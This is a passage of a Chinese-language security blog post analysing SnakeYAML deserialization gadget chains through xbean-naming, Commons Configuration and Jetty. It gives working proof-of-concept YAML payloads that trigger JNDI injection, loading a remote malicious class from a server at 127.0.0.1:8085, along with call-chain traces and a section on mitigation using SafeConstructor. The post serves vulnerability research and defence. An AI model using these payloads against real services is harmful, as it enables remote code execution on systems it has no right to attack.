+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;xbean-naming&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.26&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>poc（Reference 的第二个参数为恶意 class 文件名）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line">public class POC6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Error ,Exception&#123;</span><br><span class="line">        String poc = &quot;!!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\&quot;foo\&quot;,!!javax.naming.Reference [foo, \&quot;NQszrbCS\&quot;, \&quot;http://127.0.0.1:8085/\&quot;],!!org.apache.xbean.naming.context.WritableContext []]]&quot;;</span><br><span class="line">        Yaml yaml = new Yaml();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException#BadAttributeValueExpException(Object)</span><br><span class="line">Binding#toString()</span><br><span class="line">ContextUtil$ReadOnlyBinding#getObject()</span><br><span class="line">ContextUtil#resolve(Object, String, Name, Context)</span><br><span class="line">NamingManager#getObjectInstance(Object, Name, Context, Hashtable&lt;?,?&gt;)</span><br><span class="line">NamingManager#getObjectFactoryFromReference(Reference, String)</span><br><span class="line">VersionHelper12#loadClass(String, String)	</span><br><span class="line">VersionHelper12#loadClass(String, ClassLoader)</span><br><span class="line">Class#forName(String, boolean, ClassLoader) </span><br></pre></td></tr></table></figure>
+
+<p>Class.forName 的第二个参数设置为 true ，会经过初始化阶段，执行静态代码块：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250516110646-oonvonf.png">
+
+<p>既然这里能够调用 toString() 方法，那么后面拼接一些其他的链子诸如 Rome 、Resin ，想必也是可行。</p>
+<h3 id="0x7：Apache-Commons-Configuration"><a href="#0x7：Apache-Commons-Configuration" class="headerlink" title="0x7：Apache Commons Configuration"></a>0x7：Apache Commons Configuration</h3><p>这条链子很有意思，它是以 hashCode() 为触发点。我前面并没有介绍为什么会触发 hashCode() ，看来有漏网之鱼。</p>
+<h4 id="1、漏洞复现"><a href="#1、漏洞复现" class="headerlink" title="1、漏洞复现"></a>1、漏洞复现</h4><p>依赖：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;commons-configuration&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;commons-configuration&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;1.10&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line">public class POC7 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String poc = &quot;!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \&quot;ldap://127.0.0.1:8085/NQszrbCS\&quot;]]: 1&quot;;</span><br><span class="line">        Yaml yaml = new Yaml();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、漏洞原理"><a href="#2、漏洞原理" class="headerlink" title="2、漏洞原理"></a>2、漏洞原理</h4><p>以 ConfigurationMap 的父类 AbstractMap 的 hashcode 方法为触发点，通过迭代器 Iterator 调用了 getKeys() ，JNDIConfiguration 的 getKeys() 又恰好能造成 JNDI 注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AbstractMap&lt;K,V&gt;#hashCode()</span><br><span class="line">ConfigurationMap$ConfigurationSet#Iterator&lt;Map.Entry&lt;Object, Object&gt;&gt;</span><br><span class="line">ConfigurationMap$ConfigurationSet$ConfigurationSetIterator#ConfigurationSetIterator()</span><br><span class="line">JNDIConfiguration#getKeys()</span><br><span class="line">JNDIConfiguration#getKeys(String)</span><br><span class="line">JNDIConfiguration#getBaseContext()</span><br><span class="line">InitialContext#lookup(String) # JNDI 注入</span><br></pre></td></tr></table></figure>
+
+<h4 id="3、SnakeYaml-调用-hashCode"><a href="#3、SnakeYaml-调用-hashCode" class="headerlink" title="3、SnakeYaml 调用 hashCode()"></a>3、SnakeYaml 调用 hashCode()</h4><p>下面我们来看一下 SnakeYaml 如何调用 hashCode() ，补全前面的反序列化逻辑。</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517205301-4hblmq3.png">
+
+<p>在原来的总结之上，通过调用堆栈，我们很容易就判断出了这一分支是在 BaseConstructor#getConstructor(Node) 获取构造器的时候出现的，依照原路径，此处应该返回 <code>Constructor$ConstructYamlObject</code>​ ，而根据调用栈来看，实际返回 <code>SafeConstructor$ConstructYamlMap</code>​ 。</p>
+<p>我们重新来关注一下 BaseConstructor#getConstructor(Node) 这个方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517211813-1ymjj00.png">
+
+<p>这一次根据 Tag 来获取构造方法的结果不再是 null ，而是一个 <code>SafeConstructor$ConstructYamlMap</code>​ 对象：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517212133-rpau4fo.png">
+
+<p>我们势必要跟进 yamlConstructors.get(node.getTag()) 来看一眼了，跟进来发现直接来到了 HashMap#get(Object)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517212412-59r5ckv.png">
+
+<p>我倒是忘了它本来就是个 Map 集合，找赋值的地方才是关键。赋值的地方就在这 SafeConstructor 的构造方法之中：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517213053-9akl6d7.png">
+
+<p>SafeConstructor 则是早在 Yaml 初始化的的时候就初始化了：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517213133-xszqhx0.png">
+
+<p>这样的话就很容易明白了，由于我们反序列化的类是一个 Map 集合 ConfigurationMap ，被打上了 Tag.MAP 的标签，故而这里获取到的是 SafeConstructor 的内部类 ConstructYamlMap 作为构造器：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517214107-0hn2h2u.png">
+
+<p>并且可以由此推之，其余各类型的子类比如 Sequence、Set 等在构造时都会将 SafeConstructor 中的其他内部类作为构造器，这其中又会触发哪些方法呢？可以期待一下，未来也许会有新发现。</p>
+<p>接着往下看，开始构造，来跟进 SafeConstructor$ConstructYamlMap#construct(Node) ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517215109-7lm90l4.png">
+
+<p>跟进 BaseConstructor#constructMapping(MappingNode) ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517215155-0nw51fm.png">
+
+<p>继续跟进 SafeConstructor#constructMapping2ndStep(MappingNode, Map&lt;Object, Object&gt;)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517215213-fq99ecu.png">
+
+<p>继续跟进 SafeConstructor#flattenMapping(MappingNode node)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517215409-k4s5m3r.png">
+
+<p>继续跟进 SafeConstructor#processDuplicateKeys(MappingNode) ，在这里调用了 key.hashCode() ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517215532-mh96emp.png">
+
+<p>其实根据方法名就能知道：处理重复的 key ，创建 Map 对象的时候总要遇到这个问题，为了判断 key 值是否重复，总是会调用 key.hashCode() 获取 hash 值来判断。</p>
+<p>那么总结一下调用链，承接上文，SnakeYaml 是如何调用 hashCode()：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BaseConstructor#constructObjectNoCheck(Node)</span><br><span class="line">	-&gt; BaseConstructor#getConstructor(Node) # 获取构造器 SafeConstructor$ConstructYamlMap </span><br><span class="line">	-&gt; SafeConstructor$ConstructYamlMap#construct(Node)</span><br><span class="line">	   BaseConstructor#constructMapping(MappingNode)</span><br><span class="line">	   SafeConstructor#constructMapping2ndStep(MappingNode, Map&lt;Object, Object&gt;)</span><br><span class="line">	   SafeConstructor#flattenMapping(MappingNode node)</span><br><span class="line">	   SafeConstructor#processDuplicateKeys(MappingNode) # 调用 key.hashCode()</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x8：Jetty-Resource"><a href="#0x8：Jetty-Resource" class="headerlink" title="0x8：Jetty Resource"></a>0x8：Jetty Resource</h3><p>这条链子的触发点在有参构造 Resource(String, Object) ，后续是 Jetty 自带的 JNDI 功能。</p>
+<p>需要 Jetty 依赖：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;properties&gt;</span><br><span class="line">  &lt;!-- 指定 Jetty 版本 --&gt;</span><br><span class="line">  &lt;jetty.version&gt;9.4.50.v20221201&lt;/jetty.version&gt;</span><br><span class="line">&lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">  &lt;!-- jetty-plus 包含了 org.eclipse.jetty.plus.jndi.Resource --&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.eclipse.jetty&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jetty-plus&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;$&#123;jetty.version&#125;&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.eclipse.jetty&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jetty-jndi&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;$&#123;jetty.version&#125;&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.eclipse.jetty&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jetty-server&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;$&#123;jetty.version&#125;&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+<p>poc（Reference 的第二个参数为恶意 class 文件名）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line">public class POC8 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String poc = &quot;[!!org.eclipse.jetty.plus.jndi.Resource [\&quot;__/obj\&quot;, !!javax.naming.Reference [\&quot;foo\&quot;, \&quot;uopUboUX\&quot;, \&quot;http://127.0.0.1:8085/\&quot;]], !!org.eclipse.jetty.plus.jndi.Resource [\&quot;obj/test\&quot;, !!java.lang.Object []]]&quot;;</span><br><span class="line">        Yaml yaml = new Yaml();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Resource#Resource(String, Object)</span><br><span class="line">NamingEntry#save(Object)</span><br><span class="line">NamingUtil#bind(Context, String, Object)</span><br><span class="line">NamingContext#lookup(String)</span><br><span class="line">NamingContext#lookup(Name)</span><br><span class="line">NamingManager#getObjectInstance(Object, Name, Context, Hashtable&lt;?,?&gt;)</span><br><span class="line">NamingManager#getObjectFactoryFromReference(Reference, String)</span><br><span class="line">VersionHelper12#loadClass(String, String)	</span><br><span class="line">VersionHelper12#loadClass(String, ClassLoader)</span><br><span class="line">Class#forName(String, boolean, ClassLoader) # 第二个参数设置为 true ，会经过初始化阶段，执行静态代码块</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="五、漏洞修复"><a href="#五、漏洞修复" class="headerlink" title="五、漏洞修复"></a>五、漏洞修复</h2><ul>
+<li>禁止 yaml.load 方法中的参数可控</li>
+<li>使用 Yaml yaml = new Yaml(new SafeConstructor())；</li>
+</ul>
+<p>下面我来说一下为什么使用 new Yaml(new SafeConstructor()) 可以防止一些问题</p>
+<p>在前面讲 SnakeYaml 调用 hashCode() 的时候，我们已经见过 SafeConstructor 的构造方法，它会将 yamlConstructors 中 null 键对应的值设置为 undefinedConstructor ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517231034-e2u52vi.png">
+
+<p>这个 undefinedConstructor 的构造方法实际就是直接抛出异常：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517231202-v81f470.png">
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517231105-566myxz.png">
+
+<p>前面其实已经发现 SafeConstructor 的构造方法在 new Yaml() 这种普通模式下就会被调用，只不过这种模式下 yamlConstructors 中 null 键对应的值又被 Constructor 类给覆盖了一次，覆盖成了 Constructor$ConstructYamlObject：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517231403-mm095x0.png">
+
+<p>所以我们前面取 null 值的时候才能继续往下构造。</p>
+<p>然而当我们使用 new Yaml(new SafeConstructor()) 的时候，不会再经过 Constructor 的构造方法，而是直接进入 SafeConstructor ，这样 null 就没有机会被覆盖了。那么如果 node 节点树没有对应的 Tag ，就不会被构造。</p>
+<p>对比一下，使用 new Yaml() ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517232006-kh6vctr.png">
+
+<p>使用 new Yaml(new SafeConstructor()) ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517232037-xuroidy.png">
+
+<p>那想要绕过的话，我们利用链中的类一定要在那几个 Tag 类型之下，这时候应该能联想到 ConfigurationMap 那条链子，他是属于 Tag.MAP 类型，能够顺利地进入 SafeConstructor$ConstructYamlMap 的构造方法。但是也不行，为什么呢，因为它会对每个 key 都构造一次，递归式的，这样 key 过不了关，也没法触发 hashcode：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250517233136-0fecfe2.png">
+
+<p>当然这只是一种思路。</p>
+<p>‍</p>
+<h2 id="六、结语"><a href="#六、结语" class="headerlink" title="六、结语"></a>六、结语</h2><p>许多攻防技巧到最后都演变成了对黑白名单的绕过，比如这里就相当于是给出了一种白名单。</p>
+<p>一个项目总是有着庞大的代码量，从入口点开始剖析，它就越来越像一棵树，有着无数分支，我们分析的这些链子也不过是其中的某一个。我在分析的时候想当然地以为就从无参构造方法和非公有属性的 setter 方法入手即可，这就使我漏掉了有参构造和 hashcode 。</p>
+<p>进一步而言，我们可能漏掉了更多，以至于给了我一种莫名其妙的自信：只要反序列化接口存在，我们就一定能找到一条合适的利用链。</p>
+<p>再进一步而言，普通的反序列化也不过是调用 readObject ，那在调用这个方法之前呢？之后呢？这条路径上所调用的任意的方法都可能成为利用点，只因为它对我们输入的数据做了处理。snakeyaml 同样也不会拘泥于构造方法和 setter 方法。</p>
+<p>不过要想穷尽每一个分支，这需要庞大的算力，有没有一种在下围棋的感觉？</p>
+<p>‍</p>
+<h2 id="七、参考文章"><a href="#七、参考文章" class="headerlink" title="七、参考文章"></a>七、参考文章</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/LittleHann/p/17828948.html#_label3</span><br><span class="line">https://cmisl.github.io/2024/07/14/SnakeYaml%20%E9%93%BE/#%E5%BA%8F%E5%88%97%E5%8C%96</span><br><span class="line">https://tttang.com/archive/1591/</span><br><span class="line">https://tttang.com/archive/1815/#toc_resource</span><br><span class="line">https://www.cnblogs.com/F12-blog/p/18151239</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+
+
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/04/30/CTF/2025%20ACTF%20Web%20WP/">2025 ACTF Web 复现</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">妙尽璇机</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8">Stellar 1.26.8</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+<div class="main-mask" onclick="sidebar.toggle()"></div></div></div><div class="scripts">
+<script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
